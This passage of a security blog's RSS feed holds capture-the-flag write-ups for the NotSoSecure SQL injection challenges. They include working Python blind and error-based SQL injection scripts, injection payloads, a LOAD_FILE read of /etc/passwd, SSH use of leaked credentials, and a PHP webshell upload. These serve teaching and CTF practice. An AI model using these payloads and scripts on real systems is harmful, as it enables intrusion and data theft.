+&lt;p&gt;The &lt;code&gt;%s&lt;/code&gt; string was replaced by my custom query to retrieve data from the database. This statement had two possible cases:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;My custom query returned &lt;code&gt;NULL&lt;/code&gt;, so the second argument of &lt;code&gt;ExtractValue&lt;/code&gt; was only &lt;code&gt;\&lt;/code&gt;. The final call was &lt;code&gt;extractvalue(1, '\')&lt;/code&gt;, which is valid and don't throw error.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;My custom query returned some &lt;code&gt;value&lt;/code&gt;, so the second argument of &lt;code&gt;ExtractValue&lt;/code&gt; was &lt;code&gt;\value&lt;/code&gt;. The call was &lt;code&gt;extractvalue(1, '\value')&lt;/code&gt; and it generates an error since the &lt;code&gt;selector&lt;/code&gt; (second parameter) isn't valid for the &lt;em&gt;XML&lt;/em&gt; string (first parameter).&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The injection in the &lt;em&gt;Referer&lt;/em&gt; displayed an 'Error' string in case that the query was invalid, else it displayed 'Thanks' string. At that moment, I could know whether I'm extracting data or not. My final payload injected in the &lt;code&gt;Referer&lt;/code&gt; field was like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;&amp;quot;a'+(select extractvalue(1, concat(0x5c, (%s))))+'b&amp;quot; % cmd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I created a script to exploit the vulnerability, based on the script I made for the first &lt;em&gt;CTF&lt;/em&gt;. I only applied some modifications. If I got an 'Error' message, the custom query was right.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;import requests
+import re
+import sys
+import string
+
+from urllib import quote
+
+
+def is_valid_payload(payload):
+    post_url = &amp;quot;http://ctf.notsosecure.com/9128938921839838/f33db4ck_flag/submit.php&amp;quot;
+    data = {'name': 'hola', 'email': 'hola%40hola.com', 'message': 'hola', 'submit': 'Submit'}
+    headers = {'Referer': quote(payload)}
+    r = requests.post(post_url, data=data, headers=headers)
+
+    if re.findall('Error', r.text):
+        return True
+    else:
+        return False
+
+
+def guess_next_letter(payload, flag, chars):
+    for c in chars:
+        new_payload = payload.format(flag + c)
+        if is_valid_payload(new_payload):
+            return c
+    else:
+        return None
+
+
+def get_valid_chars(payload):
+    chars = []
+    payload = re.sub('\{0\}%', '%{0}%', payload)
+
+    print 'Recollecting chars ...'
+
+    for i in range(77, 126):
+        c = chr(i)
+        if c == '%':
+            continue
+
+        new_payload = payload.format(c)
+        if is_valid_payload(new_payload):
+            print 'Added char %s' % c
+            chars.append(c)
+
+    print &amp;quot;chars = %s&amp;quot; % repr(chars)
+    return chars
+
+if __name__ == '__main__':
+    cmd = sys.argv[1]
+    flag = ''
+    payload = &amp;quot;a'+(select extractvalue(1, concat(0x5c, (%s))))+'b&amp;quot; % cmd
+    chars = list(string.ascii_lowercase)
+    #chars = get_valid_chars(payload)
+
+    print 'Starting bruteforce ...'
+    while True:
+        letter = guess_next_letter(payload, flag, chars)
+        if not letter:
+            break
+        else:
+            flag += letter
+            print &amp;quot;Guessed letters: %s&amp;quot; % flag
+
+    print 'Flag: %s' % flag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then, I made 3 queries to the script to know the flag. First, I asked for the table name, then column name and finally the first row in the table.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-bash"&gt;python phase_2.py &amp;quot;select table_name from information_schema.tables where TABLE_SCHEMA!='information_schema' and table_name like '{0}%'&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I got the the table name was &lt;strong&gt;flag&lt;/strong&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-bash"&gt;python phase_2.py &amp;quot;select column_name FROM information_schema.columns WHERE table_name='flag' and column_name like '{0}%' limit 1&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And the column name was &lt;strong&gt;flag&lt;/strong&gt; too.&lt;/p&gt;
+&lt;p&gt;After that, I had to extract the key. I used the &lt;code&gt;get_valid_chars(payload)&lt;/code&gt; function to get a subset of chars in case it was a long flag to improve speed. The &lt;code&gt;chars&lt;/code&gt; list was &lt;code&gt;['0', '1', '2', '3', '6', '9', '_']&lt;/code&gt;. Then I ran the script once again and got the flag.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-bash"&gt;python phase_2.py &amp;quot;select flag FROM flag WHERE flag like '{0}%' limit 1&amp;quot; &amp;quot;&amp;quot;
+[...]
+Flag: 1362390
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I've been looking at other writeups and they used cool techniques to exploit this vulnerability, so you should take a look too. I'll be waiting for the 3rd CTF!&lt;/p&gt;
+&lt;/div&gt;</content:encoded></item><item><title>NotSoSecure CTF Writeup</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;Last week it was the third edition of &lt;a href="http://www.8dot8.org"&gt;8dot8 Security Conference&lt;/a&gt;, but as I'm currently in Europe I wasn't able to attend and the challenge they released was to extract some codes from an &lt;em&gt;IPhone&lt;/em&gt; application, a difficult task for someone not having an &lt;em&gt;IPhone&lt;/em&gt; device. I was a bit&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2013/10/notsosecure-ctf-writeup/</link><guid isPermaLink="false">59f734f8aade9a0001902fc6</guid><category>ctf</category><category>security</category><dc:creator>Claudio Salazar</dc:creator><pubDate>Mon, 28 Oct 2013 12:00:00 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;Last week it was the third edition of &lt;a href="http://www.8dot8.org"&gt;8dot8 Security Conference&lt;/a&gt;, but as I'm currently in Europe I wasn't able to attend and the challenge they released was to extract some codes from an &lt;em&gt;IPhone&lt;/em&gt; application, a difficult task for someone not having an &lt;em&gt;IPhone&lt;/em&gt; device. I was a bit disappointed and therefore wanted to spend my time in another challenge. I was registered for &lt;a href="http://notsosecure.com/"&gt;NotSoSecure&lt;/a&gt; CTF, so participated managing to find the two flags (&lt;a href="http://ctf.notsosecure.com/leaderboard/"&gt;final leaderboard&lt;/a&gt;). This is my writeup about the challenge.&lt;/p&gt;
+&lt;h2 id="gettingthefirstflag"&gt;Getting the first flag&lt;/h2&gt;
+&lt;p&gt;The challenge's frontpage was a normal login form asking for an unknown user/password.&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_login_form.png" style="height:400px; width:500px"&gt;
+&lt;p&gt;Trying common &lt;em&gt;SQL&lt;/em&gt; injection patterns didn't succeed and the browser didn't show any extra data. The flow in this situation was:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Fill the form&lt;/li&gt;
+&lt;li&gt;Submit the form to /checklogin.php&lt;/li&gt;
+&lt;li&gt;Redirect to /error.php&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I was a while looking at the code for any hint but nothing. Then I run &lt;em&gt;BurpSuite&lt;/em&gt; to execute some requests and realized that there's some data in the redirect response. That kind of information wasn't visible in the browser, so to take in account next time.&lt;/p&gt;
+&lt;p&gt;The data was the following:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;7365637265745f72656769737465722e68746d6c&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;After decoding that string I got &lt;code&gt;secret_register.html&lt;/code&gt;.&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_register_form.png" style="height:400px; width:500px"&gt;
+&lt;p&gt;The registration form allowed to create a new valid user to use in the first login form. You had to provide an username, e-mail and password. After creating a new user, you had to login using the first form and the following image was displayed.&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_not_admin_login.png" style="height:300px; width:500px"&gt;
+&lt;p&gt;Looking at the response, a &lt;code&gt;session_id&lt;/code&gt; cookie was created with an obfuscated value. It contained the string &lt;code&gt;%3D&lt;/code&gt; (the &lt;em&gt;URL&lt;/em&gt;-encoding for &lt;code&gt;=&lt;/code&gt;) so it seemed like a &lt;em&gt;base64&lt;/em&gt; string. The encoded value corresponded to the user email. Based on that, I thought there was a query like &lt;code&gt;SELECT email FROM users where username='myuser'&lt;/code&gt; so I tried a simple SQL injection in the parameter &lt;code&gt;regname&lt;/code&gt; like &lt;code&gt;1' OR '1'='1';--&lt;/code&gt; which returned to me the admin email: &lt;code&gt;admin@sqlilabs.com&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;All the time I was using this script to help me to only worry about &lt;em&gt;SQL&lt;/em&gt; injection payloads.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;import re
+import requests
+import sys
+import base64
+
+from urllib import unquote
+
+headers = {'User-Agent': 'Mozilla 5.0'}
+
+payload = sys.argv[1]
+reg_url = &amp;quot;http://ctf.notsosecure.com/71367217217126217712/register.php?&amp;quot; \
+    &amp;quot;regname=%s&amp;amp;regemail=email@example.org&amp;amp;regpass1=test&amp;amp;regpass2=test&amp;quot;
+
+r = requests.get(reg_url % payload, headers=headers)
+
+login_url = &amp;quot;http://ctf.notsosecure.com/71367217217126217712/checklogin.php&amp;quot;
+data = {'myusername': payload, 'mypassword': 'test'}
+
+r = requests.post(login_url, data=data, headers=headers)
+try:
+    session_id = r.cookies['session_id']
+    print &amp;quot;Text: %s &amp;quot; % base64.b64decode(unquote(session_id))
+except:
+    print &amp;quot;[-] Failed!&amp;quot;
+
+if re.findall('Attack detected', r.content):
+    print &amp;quot;[-] Attack detected&amp;quot;
+elif not re.findall(&amp;quot;You are not Admin!&amp;quot;, r.content):
+    print 'Check page!'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With that in mind, I started to think how to get the password. I was a bit tired and that's why I took the longest way to get the password, not seeing the short and easy way. I tried a SQL injection like &lt;code&gt;admin' and password='x%'&lt;/code&gt; (x = char). Obviously it wasn't a manual search since I programmed a script to optimize the number of sent requests and extract the password.&lt;br&gt;
+The script was the following.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;import requests
+import sys
+import base64
+
+from urllib import unquote
+
+base_url = &amp;quot;http://ctf.notsosecure.com/71367217217126217712&amp;quot;
+login_url = base_url + &amp;quot;/checklogin.php&amp;quot;
+reg_url = base_url + &amp;quot;/register.php?regname=%s&amp;amp;regemail=e@example.org&amp;amp;regpass1=test&amp;amp;regpass2=test&amp;quot;
+headers = {'User-Agent': 'Mozilla 5.0'}
+
+def is_valid_payload(payload):
+    #Register user
+    requests.get(reg_url % payload, headers=headers)
+
+    #Login with created user
+    data = {'myusername': payload, 'mypassword': 'test'}
+    r = requests.post(login_url, data=data, headers=headers)
+    try:
+        session_id = r.cookies['session_id']
+        email = base64.b64decode(unquote(session_id))
+        if email == 'admin@sqlilabs.com':
+            return True
+    except:
+        pass
+
+    return False
+
+def got_password(flag):
+    if not flag:
+        return False
+
+    payload = &amp;quot;admin' and password='%s';--&amp;quot; % flag
+    if is_valid_payload(payload):
+        return True
+    else:
+        return False
+
+def guess_next_letter(flag, chars):
+    payload = &amp;quot;admin' and password like '{0}%';--&amp;quot;
+
+    for c in chars:
+        new_payload = payload.format(flag + c)
+        if is_valid_payload(new_payload):
+            return c
+
+    print '[-] Letter not found.'
+    sys.exit(0)
+
+def get_valid_chars():
+    chars = []
+    payload = &amp;quot;admin' and password like '%{0}%';--&amp;quot;
+
+    print 'Recollecting chars ...'
+
+    for i in range(32, 126):
+        c = chr(i)
+        if c == '%':
+            continue
+
+        new_payload = payload.format(c)
+        if is_valid_payload(new_payload):
+            print 'Added char %s' % c
+            chars.append(c)
+
+    print &amp;quot;chars = %s&amp;quot; % repr(chars)
+    return chars
+
+if __name__ == '__main__':
+    flag = ''
+    chars = get_valid_chars()
+
+    print 'Starting bruteforce ...'
+    while not got_password(flag):
+        flag += guess_next_letter(flag, chars)
+        print &amp;quot;Guessed letters: %s&amp;quot; % flag
+
+    print 'Flag: %s' % flag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Getting this output:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-bash"&gt;$ python phase1.py
+Starting bruteforce ...
+Guessed letters: S
+Guessed letters: SQ
+Guessed letters: SQL
+Guessed letters: SQLI
+Guessed letters: SQLIL
+Guessed letters: SQLILA
+Guessed letters: SQLILAB
+Guessed letters: SQLILABR
+Guessed letters: SQLILABRO
+Guessed letters: SQLILABROC
+Guessed letters: SQLILABROCK
+Guessed letters: SQLILABROCKS
+Guessed letters: SQLILABROCKS!
+Guessed letters: SQLILABROCKS!!
+Flag: SQLILABROCKS!!%                      
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Next day, I tested with:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-bash"&gt;$ python phase2.py &amp;quot;admin' UNION SELECT password, '1' FROM users where name='admin' LIMIT 1,1--&amp;quot;
+Text: sqlilabRocKs!!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Getting the same password more easily. Login with admin as username and that password, the first flag was displayed.&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_admin_login.png" style="height:200px; width:700px"&gt;
+&lt;h2 id="gettingthesecondflag"&gt;Getting the second flag&lt;/h2&gt;
+&lt;p&gt;To get the second flag I had to read a  &lt;code&gt;secret.txt&lt;/code&gt; file. After confirming that it was a &lt;em&gt;MySQL&lt;/em&gt; database, I tested if I had permission to read/write files trying to read &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-bash"&gt;$ python phase2.py &amp;quot;admin' UNION SELECT LOAD_FILE('/etc/passwd'), '1' FROM users LIMIT 1,1--&amp;quot;
+Text: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:103:106::/var/run/dbus:/bin/false
+whoopsie:x:104:107::/nonexistent:/bin/false
+landscape:x:105:110::/var/lib/landscape:/bin/false
+sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
+postgres:x:107:112:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+ctf:x:1000:1000:,,,:/home/ctf:/bin/bash
+temp123:x:1001:1001:weakpassword1:/home/temp123:/bin/sh
+ntop:x:108:116::/var/lib/ntop:/bin/false
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The line 29 shows a strange user, so I tried to log in SSH using &lt;code&gt;temp123:weakpassword1&lt;/code&gt; getting a shell. I did a listing and saw &lt;code&gt;public_html&lt;/code&gt; directory, so I could create scripts running under the user configured in Apache (well, that's the default behaviour). At that point, I had to find where &lt;code&gt;secret.txt&lt;/code&gt; was.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-bash"&gt;$ locate secret.txt
+/secret.txt
+$ ls -l /secret.txt
+-r--------   1 www-data www-data   684 Oct 25 07:46 secret.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I uploaded a simple &lt;em&gt;PHP&lt;/em&gt; webshell, tested that I was running the shell as 'www-data' and finally issued the command &lt;code&gt;cat /secret.txt&lt;/code&gt; from the webshell, getting the second flag.&lt;/p&gt;
+&lt;h2 id="conclusions"&gt;Conclusions&lt;/h2&gt;
+&lt;p&gt;It was a very nice CTF, there are many good writeups of other people in Internet if you want to learn other techniques/tools to exploit this kind of vulnerabilities. Since these challenges belong to the &lt;a href="http://www.securitytube-training.com/virtual-labs/sql-injection-labs/index.html"&gt;SQL Injection Labs&lt;/a&gt;, I think that lab is highly recommendable for anyone who wants to understand in depth SQL injection.&lt;/p&gt;
+&lt;p&gt;I'm waiting for the next NotSoSecure CTF in December.&lt;/p&gt;
+&lt;/div&gt;</content:encoded></item><item><title>Our first university course</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;Today is a great day, I (Claudio Salazar) can officially confirm that this semester I'm going to teach a security course at Universidad Técnica Federico Santa María - Valparaíso Campus, where I got my degree in Computer Science.&lt;/p&gt;
+&lt;p&gt;The undergraduate course is named &amp;quot;Taller de Seguridad Web&amp;quot; (Web&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2013/03/our-first-university-course/</link><guid isPermaLink="false">59f734f8aade9a0001902fc7</guid><category>security</category><category>education</category><dc:creator>Claudio Salazar</dc:creator><pubDate>Tue, 19 Mar 2013 12:00:00 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;Today is a great day, I (Claudio Salazar) can officially confirm that this semester I'm going to teach a security course at Universidad Técnica Federico Santa María - Valparaíso Campus, where I got my degree in Computer Science.&lt;/p&gt;
+&lt;p&gt;The undergraduate course is named &amp;quot;Taller de Seguridad Web&amp;quot; (Web Security Workshop) and it considers twelve classes, two of them practical. It's a new course which covers latest trends in attack and defense of web applications.&lt;/p&gt;
+&lt;p&gt;All the resources related to this course can be  reached through &lt;a href="http://spect.cl/education/"&gt;education section&lt;/a&gt; of SPECT Research blog. The first lesson is available to check the goals and scheduling of the course.&lt;/p&gt;
+&lt;/div&gt;</content:encoded></item><item><title>Launching Malware en Chile</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;Today, we're launching a new project called &amp;quot;Malware en Chile&amp;quot;. The purpose of this project is to analize malware targeting Chilean people and give statictics about phishing cases in Chile.&lt;/p&gt;
+&lt;p&gt;If you want to collaborate sending malware samples or phishing cases under Chilean scope, all communication is through&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2013/01/launching-malware-en-chile/</link><guid isPermaLink="false">59f734f8aade9a0001902fc8</guid><category>security</category><category>chile</category><dc:creator>Claudio Salazar</dc:creator><pubDate>Mon, 21 Jan 2013 12:00:00 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;Today, we're launching a new project called &amp;quot;Malware en Chile&amp;quot;. The purpose of this project is to analize malware targeting Chilean people and give statictics about phishing cases in Chile.&lt;/p&gt;
+&lt;p&gt;If you want to collaborate sending malware samples or phishing cases under Chilean scope, all communication is through our Twitter account (&lt;a href="https://twitter.com/MalwareCL"&gt;@MalwareCL&lt;/a&gt;) for this project.&lt;/p&gt;
+&lt;p&gt;The page describing more things about this project is &lt;a href="http://spect.cl/projects-malware-en-chile"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;/div&gt;</content:encoded></item></channel></rss>
